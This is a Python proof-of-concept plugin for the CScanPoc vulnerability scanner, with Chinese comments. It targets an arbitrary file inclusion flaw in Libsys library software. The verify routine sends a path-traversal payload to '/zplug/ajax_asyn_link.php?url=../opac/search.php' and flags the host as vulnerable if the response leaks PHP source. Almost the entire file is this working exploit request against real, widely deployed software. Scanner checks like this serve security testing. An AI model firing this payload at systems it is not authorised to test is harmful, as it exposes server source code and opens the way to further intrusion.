# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Libsys_0002' # 平台漏洞编号，留空
    name = '汇文软件 任意文件包含'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI # 漏洞类型
    disclosure_date = '2014-07-04'  # 漏洞公布时间
    desc = '''
        汇文软件（Libsys）任意文件包含漏洞。
        /zplug/ajax_asyn_link.php?url=
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '汇文软件'  # 漏洞应用名称
    product_version = '汇文软件'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'ffc32250-e36c-40c8-91d6-d44bc70afbfb'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            hh = hackhttp.hackhttp()
            #No.1 http://www.wooyun.org/bugs/wooyun-2010-067400
            payload = "/zplug/ajax_asyn_link.php?url=../opac/search.php"
            target = self.target + payload
            code, head, body, errcode, final_url = hh.http(target)
            if '<?php @Zend;' in body:
               #security_hole(target)
               self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
